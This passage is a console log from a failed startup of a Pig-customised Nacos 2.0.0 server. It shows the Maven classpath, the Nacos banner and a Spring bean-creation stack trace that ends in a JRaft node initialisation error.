spring-webmvc-5.3.5.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-api\2.0.0.RELEASE\nacos-api-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\org\reflections\reflections\0.9.11\reflections-0.9.11.jar;D:\programSoftware\maven\repo\org\javassist\javassist\3.21.0-GA\javassist-3.21.0-GA.jar;D:\programSoftware\maven\repo\javax\annotation\javax.annotation-api\1.3.2\javax.annotation-api-1.3.2.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-core\2.0.0.RELEASE\nacos-core-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-common\2.0.0.RELEASE\nacos-common-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-consistency\2.0.0.RELEASE\nacos-consistency-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\com\caucho\hessian\4.0.63\hessian-4.0.63.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-auth\2.0.0.RELEASE\nacos-auth-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-sys\2.0.0.RELEASE\nacos-sys-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\io\jsonwebtoken\jjwt-api\0.11.2\jjwt-api-0.11.2.jar;D:\programSoftware\maven\repo\io\jsonwebtoken\jjwt-impl\0.11.2\jjwt-impl-0.11.2.jar;D:\programSoftware\maven\repo\io\jsonwebtoken\jjwt-jackson\0.11.2\jjwt-jackson-0.11.2.jar;D:\programSoftware\maven\repo\com\alipay\sofa\jraft-core\1.3.5\jraft-core-1.3.5.jar;D:\programSoftware\maven\repo\org\ow2\asm\asm\6.0\asm-6.0.jar;D:\programSoftware\maven\repo\org\rocksdb\rocksdbjni\5.18.4\rocksdbjni-5.18.4.jar;D:\programSoftware\maven\repo\net\java\dev\jna\jna\5.5.0\jna-5.5.0.jar;D:\programSoftware\maven\repo\org\jctools\jctools-core\2.1.1\jctools-core-2.1.1.jar;D:\programSoftware\maven\repo\com\lmax\disruptor\3.3.7\disruptor-3.3.7.jar;D:\programSoftware\maven\repo\commons-lang\commons-lang\2.6\commons-lang-2.6.jar;D:\programSoftware\maven\repo\com\alipay\sofa\hessian\3.3.6\hessian-3.3.6.jar;D:\programSoftware\maven\repo\io\dropwizard\metrics\metrics-core\4.1.18\metrics-core-4.1.18.jar;D:\programSoftware\maven\repo\com\alipay\sofa\rpc-grpc-impl\1.3.5\rpc-grpc-impl-1.3.5.jar;D:\programSoftware\maven\repo\com\google\guava\guava\24.1.1-jre\guava-24.1.1-jre.jar;D:\programSoftware\maven\repo\com\google\code\findbugs\jsr305\1.3.9\jsr305-1.3.9.jar;D:\programSoftware\maven\repo\org\checkerframework\checker-compat-qual\2.0.0\checker-compat-qual-2.0.0.jar;D:\programSoftware\maven\repo\com\google\j2objc\j2objc-annotations\1.1\j2objc-annotations-1.1.jar;D:\programSoftware\maven\repo\org\codehaus\mojo\animal-sniffer-annotations\1.14\animal-sniffer-annotations-1.14.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-starter-jdbc\2.4.4\spring-boot-starter-jdbc-2.4.4.jar;D:\programSoftware\maven\repo\com\zaxxer\HikariCP\3.4.5\HikariCP-3.4.5.jar;D:\programSoftware\maven\repo\org\springframework\spring-jdbc\5.3.5\spring-jdbc-5.3.5.jar;D:\programSoftware\maven\repo\org\springframework\spring-tx\5.3.5\spring-tx-5.3.5.jar;D:\programSoftware\maven\repo\commons-io\commons-io\2.2\commons-io-2.2.jar;D:\programSoftware\maven\repo\mysql\mysql-connector-java\8.0.23\mysql-connector-java-8.0.23.jar;D:\programSoftware\maven\repo\org\apache\derby\derby\10.14.2.0\derby-10.14.2.0.jar;D:\programSoftware\maven\repo\ch\qos\logback\logback-classic\1.2.3\logback-classic-1.2.3.jar;D:\programSoftware\maven\repo\org\aspectj\aspectjrt\1.9.6\aspectjrt-1.9.6.jar;D:\programSoftware\maven\repo\cglib\cglib-nodep\2.1\cglib-nodep-2.1.jar;D:\programSoftware\maven\repo\org\apache\httpcomponents\httpasyncclient\4.1.4\httpasyncclient-4.1.4.jar;D:\programSoftware\maven\repo\org\apache\httpcomponents\httpcore-nio\4.4.14\httpcore-nio-4.4.14.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-starter-tomcat\2.4.4\spring-boot-starter-tomcat-2.4.4.jar;D:\programSoftware\maven\repo\jakarta\annotation\jakarta.annotation-api\1.3.5\jakarta.annotation-api-1.3.5.jar;D:\programSoftware\maven\repo\org\glassfish\jakarta.el\3.0.3\jakarta.el-3.0.3.jar;D:\programSoftware\maven\repo\org\apache\tomcat\embed\tomcat-embed-websocket\9.0.44\tomcat-embed-websocket-9.0.44.jar;D:\programSoftware\maven\repo\com\fasterxml\jackson\core\jackson-core\2.11.4\jackson-core-2.11.4.jar;D:\programSoftware\maven\repo\com\fasterxml\jackson\core\jackson-databind\2.11.4\jackson-databind-2.11.4.jar;D:\programSoftware\maven\repo\com\fasterxml\jackson\core\jackson-annotations\2.11.4\jackson-annotations-2.11.4.jar;D:\programSoftware\maven\repo\org\apache\commons\commons-lang3\3.11\commons-lang3-3.11.jar;D:\programSoftware\maven\repo\io\micrometer\micrometer-registry-prometheus\1.6.5\micrometer-registry-prometheus-1.6.5.jar;D:\programSoftware\maven\repo\io\prometheus\simpleclient_common\0.9.0\simpleclient_common-0.9.0.jar;D:\programSoftware\maven\repo\io\micrometer\micrometer-registry-influx\1.6.5\micrometer-registry-influx-1.6.5.jar;D:\programSoftware\maven\repo\io\micrometer\micrometer-registry-elastic\1.6.5\micrometer-registry-elastic-1.6.5.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-starter-aop\2.4.4\spring-boot-starter-aop-2.4.4.jar;D:\programSoftware\maven\repo\org\aspectj\aspectjweaver\1.9.6\aspectjweaver-1.9.6.jar;D:\programSoftware\maven\repo\org\apache\tomcat\embed\tomcat-embed-jasper\9.0.44\tomcat-embed-jasper-9.0.44.jar;D:\programSoftware\maven\repo\org\apache\tomcat\embed\tomcat-embed-core\9.0.44\tomcat-embed-core-9.0.44.jar;D:\programSoftware\maven\repo\org\apache\tomcat\tomcat-annotations-api\9.0.44\tomcat-annotations-api-9.0.44.jar;D:\programSoftware\maven\repo\org\apache\tomcat\embed\tomcat-embed-el\9.0.44\tomcat-embed-el-9.0.44.jar;D:\programSoftware\maven\repo\org\eclipse\jdt\ecj\3.18.0\ecj-3.18.0.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-naming\2.0.0.RELEASE\nacos-naming-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\io\netty\netty-all\4.1.60.Final\netty-all-4.1.60.Final.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot\2.4.4\spring-boot-2.4.4.jar;D:\programSoftware\maven\repo\org\springframework\spring-context\5.3.5\spring-context-5.3.5.jar;D:\programSoftware\maven\repo\commons-collections\commons-collections\3.2.2\commons-collections-3.2.2.jar;D:\programSoftware\maven\repo\org\codehaus\jackson\jackson-core-asl\1.9.13\jackson-core-asl-1.9.13.jar;D:\programSoftware\maven\repo\org\slf4j\slf4j-api\1.7.30\slf4j-api-1.7.30.jar;D:\programSoftware\maven\repo\ch\qos\logback\logback-core\1.2.3\logback-core-1.2.3.jar;D:\programSoftware\maven\repo\org\apache\mina\mina-core\2.0.0-RC1\mina-core-2.0.0-RC1.jar;D:\programSoftware\maven\repo\org\javatuples\javatuples\1.2\javatuples-1.2.jar;D:\programSoftware\maven\repo\org\apache\httpcomponents\httpcore\4.4.14\httpcore-4.4.14.jar;D:\programSoftware\maven\repo\org\apache\httpcomponents\httpclient\4.5.13\httpclient-4.5.13.jar;D:\programSoftware\maven\repo\commons-codec\commons-codec\1.15\commons-codec-1.15.jar;D:\programSoftware\maven\repo\org\slf4j\log4j-over-slf4j\1.7.30\log4j-over-slf4j-1.7.30.jar;D:\programSoftware\maven\repo\org\slf4j\jcl-over-slf4j\1.7.30\jcl-over-slf4j-1.7.30.jar;D:\programSoftware\maven\repo\org\slf4j\jul-to-slf4j\1.7.30\jul-to-slf4j-1.7.30.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-cmdb\2.0.0.RELEASE\nacos-cmdb-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-istio\2.0.0.RELEASE\nacos-istio-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-client\2.0.0.RELEASE\nacos-client-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\io\prometheus\simpleclient\0.5.0\simpleclient-0.5.0.jar;D:\programSoftware\maven\repo\org\yaml\snakeyaml\1.27\snakeyaml-1.27.jar;D:\programSoftware\maven\repo\io\grpc\grpc-netty-shaded\1.24.0\grpc-netty-shaded-1.24.0.jar;D:\programSoftware\maven\repo\io\grpc\grpc-core\1.24.0\grpc-core-1.24.0.jar;D:\programSoftware\maven\repo\com\google\code\gson\gson\2.8.6\gson-2.8.6.jar;D:\programSoftware\maven\repo\com\google\android\annotations\4.1.1.4\annotations-4.1.1.4.jar;D:\programSoftware\maven\repo\io\perfmark\perfmark-api\0.17.0\perfmark-api-0.17.0.jar;D:\programSoftware\maven\repo\io\opencensus\opencensus-api\0.21.0\opencensus-api-0.21.0.jar;D:\programSoftware\maven\repo\io\opencensus\opencensus-contrib-grpc-metrics\0.21.0\opencensus-contrib-grpc-metrics-0.21.0.jar;D:\programSoftware\maven\repo\io\grpc\grpc-protobuf\1.24.0\grpc-protobuf-1.24.0.jar;D:\programSoftware\maven\repo\io\grpc\grpc-api\1.24.0\grpc-api-1.24.0.jar;D:\programSoftware\maven\repo\io\grpc\grpc-context\1.24.0\grpc-context-1.24.0.jar;D:\programSoftware\maven\repo\com\google\errorprone\error_prone_annotations\2.3.2\error_prone_annotations-2.3.2.jar;D:\programSoftware\maven\repo\io\grpc\grpc-protobuf-lite\1.24.0\grpc-protobuf-lite-1.24.0.jar;D:\programSoftware\maven\repo\io\grpc\grpc-stub\1.24.0\grpc-stub-1.24.0.jar;D:\programSoftware\maven\repo\com\google\api\grpc\proto-google-common-protos\1.17.0\proto-google-common-protos-1.17.0.jar;D:\programSoftware\maven\repo\com\google\protobuf\protobuf-java\3.8.0\protobuf-java-3.8.0.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-starter-security\2.4.4\spring-boot-starter-security-2.4.4.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-starter\2.4.4\spring-boot-starter-2.4.4.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-starter-logging\2.4.4\spring-boot-starter-logging-2.4.4.jar;D:\programSoftware\maven\repo\org\apache\logging\log4j\log4j-to-slf4j\2.13.3\log4j-to-slf4j-2.13.3.jar;D:\programSoftware\maven\repo\org\apache\logging\log4j\log4j-api\2.13.3\log4j-api-2.13.3.jar;D:\programSoftware\maven\repo\org\springframework\spring-aop\5.3.5\spring-aop-5.3.5.jar;D:\programSoftware\maven\repo\org\springframework\spring-beans\5.3.5\spring-beans-5.3.5.jar;D:\programSoftware\maven\repo\org\springframework\security\spring-security-config\5.4.5\spring-security-config-5.4.5.jar;D:\programSoftware\maven\repo\org\springframework\security\spring-security-core\5.4.5\spring-security-core-5.4.5.jar;D:\programSoftware\maven\repo\org\springframework\security\spring-security-web\5.4.5\spring-security-web-5.4.5.jar;D:\programSoftware\maven\repo\org\springframework\spring-expression\5.3.5\spring-expression-5.3.5.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-autoconfigure\2.4.4\spring-boot-autoconfigure-2.4.4.jar;D:\programSoftware\maven\repo\org\springframework\cloud\spring-cloud-starter-bootstrap\3.0.2\spring-cloud-starter-bootstrap-3.0.2.jar;D:\programSoftware\maven\repo\org\springframework\cloud\spring-cloud-starter\3.0.2\spring-cloud-starter-3.0.2.jar;D:\programSoftware\maven\repo\org\springframework\cloud\spring-cloud-context\3.0.2\spring-cloud-context-3.0.2.jar;D:\programSoftware\maven\repo\org\springframework\security\spring-security-crypto\5.4.5\spring-security-crypto-5.4.5.jar;D:\programSoftware\maven\repo\org\springframework\cloud\spring-cloud-commons\3.0.2\spring-cloud-commons-3.0.2.jar;D:\programSoftware\maven\repo\org\springframework\security\spring-security-rsa\1.0.9.RELEASE\spring-security-rsa-1.0.9.RELEASE.jar;D:\programSoftware\maven\repo\org\bouncycastle\bcpkix-jdk15on\1.64\bcpkix-jdk15on-1.64.jar;D:\programSoftware\maven\repo\org\bouncycastle\bcprov-jdk15on\1.64\bcprov-jdk15on-1.64.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-configuration-processor\2.4.4\spring-boot-configuration-processor-2.4.4.jar;D:\programSoftware\maven\repo\com\github\ulisesbocchio\jasypt-spring-boot-starter\2.1.0\jasypt-spring-boot-starter-2.1.0.jar;D:\programSoftware\maven\repo\com\github\ulisesbocchio\jasypt-spring-boot\2.1.0\jasypt-spring-boot-2.1.0.jar;D:\programSoftware\maven\repo\org\jasypt\jasypt\1.9.2\jasypt-1.9.2.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-starter-actuator\2.4.4\spring-boot-starter-actuator-2.4.4.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-actuator-autoconfigure\2.4.4\spring-boot-actuator-autoconfigure-2.4.4.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-actuator\2.4.4\spring-boot-actuator-2.4.4.jar;D:\programSoftware\maven\repo\com\fasterxml\jackson\datatype\jackson-datatype-jsr310\2.11.4\jackson-datatype-jsr310-2.11.4.jar;D:\programSoftware\maven\repo\io\micrometer\micrometer-core\1.6.5\micrometer-core-1.6.5.jar;D:\programSoftware\maven\repo\org\hdrhistogram\HdrHistogram\2.1.12\HdrHistogram-2.1.12.jar;D:\programSoftware\maven\repo\org\latencyutils\LatencyUtils\2.0.3\LatencyUtils-2.0.3.jar;D:\programSoftware\maven\repo\de\codecentric\spring-boot-admin-starter-client\2.3.1\spring-boot-admin-starter-client-2.3.1.jar;D:\programSoftware\maven\repo\de\codecentric\spring-boot-admin-client\2.3.1\spring-boot-admin-client-2.3.1.jar;D:\programSoftware\maven\repo\org\projectlombok\lombok\1.18.18\lombok-1.18.18.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-test\2.4.4\spring-boot-test-2.4.4.jar;D:\programSoftware\maven\repo\org\springframework\spring-core\5.3.5\spring-core-5.3.5.jar;D:\programSoftware\maven\repo\org\springframework\spring-jcl\5.3.5\spring-jcl-5.3.5.jar;D:\programSoftware\maven\repo\org\springframework\spring-test\5.3.5\spring-test-5.3.5.jar com.alibaba.nacos.PigNacosApplication 2021-05-19 16:16:41.194 INFO 12552 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos started successfully in stand alone mode. use external storage ,--. ,--.'| ,--,: : | Nacos ,`--.'`| ' : ,---. Running in stand alone mode, All function modules | : : | | ' ,'\ .--.--. Port: 8848 : | \ | : ,--.--. ,---. / / | / / ' Pid: 12552 | : ' '; | / \ / \. ; ,. :| : /`./ Console: http://192.168.56.1:8848/nacos/index.html ' ' ;. ;.--. .-. | / / '' | |: :| : ;_ | | | \ | \__\/: . .. ' / ' | .; : \ \ `. https://nacos.io ' : | ; .' ,"" .--.; |' ; :__| : | `----. \ | | '`--' / / ,. |' | '.'|\ \ / / /`--' / ' : | ; : .' \ : : `----' '--'. / ; |.' | , .-./\ \ / `--'---' '---' `--`---' `----' 2021-05-19 16:16:44.472 INFO 12552 --- [ main] o.s.cloud.context.scope.GenericScope : BeanFactory id=0a04fe92-46aa-366e-805c-9f131635fb2a 2021-05-19 16:16:44.617 INFO 12552 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@7d2d5625' of type [org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-05-19 16:16:44.621 INFO 12552 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-05-19 16:16:44.837 INFO 12552 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8848 (http) 2021-05-19 16:16:45.101 INFO 12552 --- [ main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 3289 ms 2021-05-19 16:16:47.725 WARN 12552 --- [ main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'instanceOperatorClientImpl' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/InstanceOperatorClientImpl.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'clientOperationServiceProxy' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/v2/service/ClientOperationServiceProxy.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. 2021-05-19 16:16:47.745 INFO 12552 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: C:\Users\华为\nacos\logs 2021-05-19 16:16:47.745 INFO 12552 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: C:\Users\华为\nacos\conf 2021-05-19 16:16:47.746 INFO 12552 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos Log files: C:\Users\华为\nacos\data 2021-05-19 16:16:47.746 ERROR 12552 --- [ main] c.a.n.c.l.StartingApplicationListener : Startup errors : {} org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'instanceOperatorClientImpl' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/InstanceOperatorClientImpl.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'clientOperationServiceProxy' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/v2/service/ClientOperationServiceProxy.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:144) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:769) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:761) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:426) at org.springframework.boot.SpringApplication.run(SpringApplication.java:326) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1313) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1302) at com.alibaba.nacos.PigNacosApplication.main(PigNacosApplication.java:37) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'clientOperationServiceProxy' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/v2/service/ClientOperationServiceProxy.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 20 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:315) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:296) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 34 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:225) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:117) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:311) ... 48 common frames omitted Caused by: java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at com.alipay.sofa.jraft.RaftServiceFactory.createAndInitRaftNode(RaftServiceFactory.java:48) at com.alipay.sofa.jraft.RaftGroupService.start(RaftGroupService.java:129) at com.alibaba.nacos.core.distributed.raft.JRaftServer.createMultiRaftGroup(JRaftServer.java:268) at com.alibaba.nacos.core.distributed.raft.JRaftProtocol.addRequestProcessors(JRaftProtocol.java:163) at com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl.&lt;init&gt;(PersistentClientOperationServiceImpl.java:92) at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:212) ... 50 common frames omitted 2021-05-19 16:16:49.259 WARN 12552 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start close 2021-05-19 16:16:49.259 WARN 12552 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : C:\Users\华为\nacos\data\tps 2021-05-19 16:16:49.259 WARN 12552 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : C:\Users\华为\nacos\conf 2021-05-19 16:16:49.260 WARN 12552 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] start to shutdown this watcher which is watch : C:\Users\华为\nacos\data\loader 2021-05-19 16:16:49.260 WARN 12552 --- [ main] c.a.nacos.sys.file.WatchFileCenter : [WatchFileCenter] already closed 2021-05-19 16:16:49.260 WARN 12552 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Start destroying Publisher 2021-05-19 16:16:49.260 WARN 12552 --- [ main] c.a.nacos.common.notify.NotifyCenter : [NotifyCenter] Destruction of the end 2021-05-19 16:16:49.260 ERROR 12552 --- [ main] c.a.n.c.l.StartingApplicationListener : Nacos failed to start, please see C:\Users\华为\nacos\logs\nacos.log for more details. 2021-05-19 16:16:49.269 INFO 12552 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2021-05-19 16:16:49.286 ERROR 12552 --- [ 